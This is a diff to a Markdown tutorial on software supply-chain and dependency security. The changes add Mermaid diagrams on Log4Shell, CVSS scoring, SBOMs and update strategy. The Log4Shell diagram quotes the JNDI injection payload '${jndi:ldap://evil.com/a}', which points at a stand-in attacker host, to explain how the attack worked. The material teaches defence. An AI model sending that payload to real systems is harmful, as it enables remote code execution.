@@ -21,7 +21,34 @@ Before diving into dependency security, you should understand:
 
 Modern applications are mostly third-party code:
 
+```mermaid
+flowchart TD
+    APP["Typical Spring Boot Application"]
+    
+    YOUR_CODE["Your Code<br/>5,000 lines<br/>████"]
+    DIRECT["Direct Dependencies<br/>50,000 lines<br/>████████████"]
+    TRANSITIVE["Transitive Deps<br/>500,000 lines<br/>██████████████████████"]
+    
+    NOTE["You wrote ~1% of the code running in production!<br/>You're trusting thousands of contributors<br/>you've never met."]
+    
+    APP --> YOUR_CODE
+    APP --> DIRECT
+    APP --> TRANSITIVE
+    YOUR_CODE --> NOTE
+    DIRECT --> NOTE
+    TRANSITIVE --> NOTE
+    
+    style APP fill:#e3f2fd
+    style YOUR_CODE fill:#c8e6c9
+    style DIRECT fill:#fff9c4
+    style TRANSITIVE fill:#ffcdd2
+    style NOTE fill:#fce4ec
 ```
+
+<details>
+<summary>ASCII diagram (reference)</summary>
+
+```text
 ┌─────────────────────────────────────────────────────────────────────────┐
 │                    CODE COMPOSITION                                      │
 ├─────────────────────────────────────────────────────────────────────────┤
@@ -44,6 +71,8 @@ Modern applications are mostly third-party code:
 └─────────────────────────────────────────────────────────────────────────┘
 ```
 
+</details>
+
 ### Real-World Supply Chain Attacks
 
 | Incident | Year | Impact |
@@ -56,7 +85,26 @@ Modern applications are mostly third-party code:
 
 ### The Log4Shell Case Study
 
+```mermaid
+flowchart TD
+    WHAT["What happened:<br/>• Log4j, a logging library used by millions of Java apps<br/>• Vulnerability allowed remote code execution via log messages<br/>• Attacker sends: ${jndi:ldap://evil.com/a}<br/>• Log4j fetches and executes code from attacker's server"]
+    
+    WHY["Why it was catastrophic:<br/>• Log4j is everywhere (Spring, Elasticsearch, Minecraft, etc.)<br/>• Many didn't know they had it (transitive dependency)<br/>• Trivial to exploit (just put payload in any logged field)<br/>• CVSS Score: 10.0 (maximum severity)"]
+    
+    LESSONS["Lessons:<br/>• Know your dependencies (direct AND transitive)<br/>• Have a process to respond to vulnerabilities<br/>• Monitor for CVEs continuously<br/>• Have an SBOM (Software Bill of Materials)"]
+    
+    WHAT --> WHY
+    WHY --> LESSONS
+    
+    style WHAT fill:#ffcdd2
+    style WHY fill:#ffcdd2
+    style LESSONS fill:#fff9c4
 ```
+
+<details>
+<summary>ASCII diagram (reference)</summary>
+
+```text
 ┌─────────────────────────────────────────────────────────────────────────┐
 │                    LOG4SHELL (CVE-2021-44228)                            │
 ├─────────────────────────────────────────────────────────────────────────┤
@@ -82,6 +130,8 @@ Modern applications are mostly third-party code:
 └─────────────────────────────────────────────────────────────────────────┘
 ```
 
+</details>
+
 ---
 
 ## 2️⃣ Intuition and Mental Model
@@ -90,7 +140,59 @@ Modern applications are mostly third-party code:
 
 Think of your application like a restaurant:
 
+```mermaid
+flowchart TD
+    RESTAURANT["YOUR RESTAURANT<br/>(Application)"]
+    
+    MEAT["Meat Supplier<br/>(Direct Dependency: Spring Boot)"]
+    TOMCAT["Farm A<br/>(Transitive: Tomcat)"]
+    JACKSON["Farm B<br/>(Transitive: Jackson)"]
+    LOGBACK["Farm C<br/>(Transitive: Logback)"]
+    
+    VEG["Vegetable Supplier<br/>(Direct Dependency: Hibernate)"]
+    FARMS["Various Farms<br/>(Transitive dependencies)"]
+    
+    SPICE["Spice Supplier<br/>(Direct Dependency: Apache Commons)"]
+    SOURCES["Various Sources<br/>(Transitive dependencies)"]
+    
+    PROBLEM["If ANY supplier in the chain is compromised:<br/>• Contaminated ingredients reach your kitchen<br/>• Your customers get sick<br/>• You're responsible (even if you didn't cause it)"]
+    
+    SOLUTION["Solution:<br/>• Know all your suppliers (dependency tree)<br/>• Verify quality (vulnerability scanning)<br/>• Have recall procedures (update process)<br/>• Keep records (SBOM)"]
+    
+    RESTAURANT --> MEAT
+    RESTAURANT --> VEG
+    RESTAURANT --> SPICE
+    
+    MEAT --> TOMCAT
+    MEAT --> JACKSON
+    MEAT --> LOGBACK
+    
+    VEG --> FARMS
+    SPICE --> SOURCES
+    
+    MEAT --> PROBLEM
+    VEG --> PROBLEM
+    SPICE --> PROBLEM
+    
+    PROBLEM --> SOLUTION
+    
+    style RESTAURANT fill:#e3f2fd
+    style MEAT fill:#fff9c4
+    style VEG fill:#fff9c4
+    style SPICE fill:#fff9c4
+    style TOMCAT fill:#c8e6c9
+    style JACKSON fill:#c8e6c9
+    style LOGBACK fill:#c8e6c9
+    style FARMS fill:#c8e6c9
+    style SOURCES fill:#c8e6c9
+    style PROBLEM fill:#ffcdd2
+    style SOLUTION fill:#c8e6c9
 ```
+
+<details>
+<summary>ASCII diagram (reference)</summary>
+
+```text
 ┌─────────────────────────────────────────────────────────────────────────┐
 │                    SUPPLY CHAIN ANALOGY                                  │
 ├─────────────────────────────────────────────────────────────────────────┤
@@ -125,13 +227,49 @@ Think of your application like a restaurant:
 └─────────────────────────────────────────────────────────────────────────┘
 ```
 
+</details>
+
 ---
 
 ## 3️⃣ How Dependency Security Works
 
 ### The Vulnerability Lifecycle
 
+```mermaid
+flowchart TD
+    STEP1["1. DISCOVERY<br/>Researcher or attacker finds vulnerability"]
+    STEP2["2. DISCLOSURE<br/>Reported to maintainer (responsible disclosure)<br/>OR exploited in the wild (zero-day)"]
+    STEP3["3. CVE ASSIGNMENT<br/>CVE ID assigned (e.g., CVE-2021-44228)<br/>CVSS score calculated (0-10 severity)"]
+    STEP4["4. PATCH RELEASED<br/>Maintainer releases fixed version"]
+    STEP5["5. DATABASE UPDATE<br/>NVD, GitHub Advisory, Snyk DB updated"]
+    STEP6["6. DETECTION<br/>Your scanner finds the vulnerability"]
+    STEP7["7. REMEDIATION<br/>You update the dependency"]
+    
+    WINDOW["WINDOW OF EXPOSURE: Time between 1 and 7<br/>Goal: Minimize this window"]
+    
+    STEP1 --> STEP2
+    STEP2 --> STEP3
+    STEP3 --> STEP4
+    STEP4 --> STEP5
+    STEP5 --> STEP6
+    STEP6 --> STEP7
+    STEP1 --> WINDOW
+    STEP7 --> WINDOW
+    
+    style STEP1 fill:#e3f2fd
+    style STEP2 fill:#fff9c4
+    style STEP3 fill:#fff9c4
+    style STEP4 fill:#c8e6c9
+    style STEP5 fill:#c8e6c9
+    style STEP6 fill:#fce4ec
+    style STEP7 fill:#c8e6c9
+    style WINDOW fill:#ffcdd2
 ```
+
+<details>
+<summary>ASCII diagram (reference)</summary>
+
+```text
 ┌─────────────────────────────────────────────────────────────────────────┐
 │                    VULNERABILITY LIFECYCLE                               │
 ├─────────────────────────────────────────────────────────────────────────┤
@@ -171,9 +309,32 @@ Think of your application like a restaurant:
 └─────────────────────────────────────────────────────────────────────────┘
 ```
 
+</details>
+
 ### CVSS Scoring
 
+```mermaid
+flowchart TD
+    CRITICAL["9.0-10.0: CRITICAL<br/>Response Time: Immediate<br/>Example: Log4Shell (RCE)"]
+    HIGH["7.0-8.9: HIGH<br/>Response Time: Within 24-48 hrs<br/>Example: SQL Injection"]
+    MEDIUM["4.0-6.9: MEDIUM<br/>Response Time: Within 1-2 weeks<br/>Example: XSS vulnerabilities"]
+    LOW["0.1-3.9: LOW<br/>Response Time: Next release<br/>Example: Information disclosure"]
+    NONE["0.0: NONE<br/>Response Time: N/A<br/>Example: N/A"]
+    
+    VECTOR["CVSS Vector Example:<br/>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H<br/><br/>• AV:N = Attack Vector: Network (remote)<br/>• AC:L = Attack Complexity: Low (easy to exploit)<br/>• PR:N = Privileges Required: None<br/>• UI:N = User Interaction: None<br/>• S:C = Scope: Changed (affects other components)<br/>• C:H = Confidentiality Impact: High<br/>• I:H = Integrity Impact: High<br/>• A:H = Availability Impact: High"]
+    
+    style CRITICAL fill:#ffcdd2
+    style HIGH fill:#ffcc80
+    style MEDIUM fill:#fff9c4
+    style LOW fill:#c8e6c9
+    style NONE fill:#e3f2fd
+    style VECTOR fill:#fce4ec
 ```
+
+<details>
+<summary>ASCII diagram (reference)</summary>
+
+```text
 ┌─────────────────────────────────────────────────────────────────────────┐
 │                    CVSS SEVERITY RATINGS                                 │
 ├─────────────────────────────────────────────────────────────────────────┤
@@ -199,9 +360,34 @@ Think of your application like a restaurant:
 └─────────────────────────────────────────────────────────────────────────┘
 ```
 
+</details>
+
 ### Software Bill of Materials (SBOM)
 
+```mermaid
+flowchart TD
+    SBOM["SBOM = Complete inventory of<br/>all software components"]
+    
+    ANALOGY["Like a food ingredients label:<br/>• Lists every component<br/>• Shows versions<br/>• Tracks origins<br/>• Enables rapid response to vulnerabilities"]
+    
+    FORMATS["SBOM Formats:<br/>• SPDX (Linux Foundation)<br/>• CycloneDX (OWASP)<br/>• SWID Tags (ISO standard)"]
+    
+    EXAMPLE["Example CycloneDX entry:<br/>{<br/>  type: library,<br/>  name: spring-boot-starter-web,<br/>  version: 3.2.0,<br/>  purl: pkg:maven/org.springframework.boot/spring-boot-starter-web@3.2.0,<br/>  licenses: [{id: Apache-2.0}],<br/>  hashes: [{alg: SHA-256, content: abc123...}]<br/>}"]
+    
+    SBOM --> ANALOGY
+    SBOM --> FORMATS
+    FORMATS --> EXAMPLE
+    
+    style SBOM fill:#e3f2fd
+    style ANALOGY fill:#fff9c4
+    style FORMATS fill:#c8e6c9
+    style EXAMPLE fill:#fce4ec
 ```
+
+<details>
+<summary>ASCII diagram (reference)</summary>
+
+```text
 ┌─────────────────────────────────────────────────────────────────────────┐
 │                    SBOM CONCEPT                                          │
 ├─────────────────────────────────────────────────────────────────────────┤
@@ -231,6 +417,8 @@ Think of your application like a restaurant:
 │                                                                          │
 └─────────────────────────────────────────────────────────────────────────┘
 ```
+
+</details>
 
 ---
 
@@ -355,7 +543,30 @@ Google's supply chain security:
 
 ### Industry Best Practices
 
+```mermaid
+flowchart TD
+    LEVEL1["Level 1: BASIC<br/>• Know your direct dependencies<br/>• Manual updates occasionally<br/>• React to major CVE announcements"]
+    
+    LEVEL2["Level 2: MANAGED<br/>• Automated vulnerability scanning in CI<br/>• Dependency update PRs (Dependabot/Renovate)<br/>• SBOM generation<br/>• Defined response SLAs"]
+    
+    LEVEL3["Level 3: PROACTIVE<br/>• Continuous monitoring (not just at build)<br/>• License compliance checking<br/>• Dependency health metrics<br/>• Automated security patches"]
+    
+    LEVEL4["Level 4: ADVANCED<br/>• Supply chain attestation (SLSA)<br/>• Artifact signing and verification<br/>• Private artifact repository with scanning<br/>• Dependency firewall (block risky packages)"]
+    
+    LEVEL1 --> LEVEL2
+    LEVEL2 --> LEVEL3
+    LEVEL3 --> LEVEL4
+    
+    style LEVEL1 fill:#fff9c4
+    style LEVEL2 fill:#c8e6c9
+    style LEVEL3 fill:#e3f2fd
+    style LEVEL4 fill:#fce4ec
 ```
+
+<details>
+<summary>ASCII diagram (reference)</summary>
+
+```text
 ┌─────────────────────────────────────────────────────────────────────────┐
 │                    DEPENDENCY SECURITY MATURITY                          │
 ├─────────────────────────────────────────────────────────────────────────┤
@@ -385,6 +596,8 @@ Google's supply chain security:
 │                                                                          │
 └─────────────────────────────────────────────────────────────────────────┘
 ```
+
+</details>
 
 ---
 
@@ -804,7 +1017,26 @@ jobs:
 
 ### The Update Dilemma
 
+```mermaid
+flowchart TD
+    AGGRESSIVE["Too Aggressive:<br/>• Update everything immediately<br/>• Risk: Breaking changes, regressions<br/>• Cost: Constant testing, instability"]
+    
+    CONSERVATIVE["Too Conservative:<br/>• Only update when absolutely necessary<br/>• Risk: Accumulating vulnerabilities<br/>• Cost: Larger, riskier updates when forced"]
+    
+    BALANCED["Balanced Approach:<br/>• Security updates: Immediate (within SLA)<br/>• Patch versions: Weekly, auto-merge with tests<br/>• Minor versions: Monthly, manual review<br/>• Major versions: Quarterly, planned migration"]
+    
+    AGGRESSIVE -.->|"Avoid"| BALANCED
+    CONSERVATIVE -.->|"Avoid"| BALANCED
+    
+    style AGGRESSIVE fill:#ffcdd2
+    style CONSERVATIVE fill:#ffcdd2
+    style BALANCED fill:#c8e6c9
 ```
+
+<details>
+<summary>ASCII diagram (reference)</summary>
+
+```text
 ┌─────────────────────────────────────────────────────────────────────────┐
 │                    THE UPDATE DILEMMA                                    │
 ├─────────────────────────────────────────────────────────────────────────┤
@@ -827,6 +1059,8 @@ jobs:
 │                                                                          │
 └─────────────────────────────────────────────────────────────────────────┘
 ```
+
+</details>
 
 ---
 
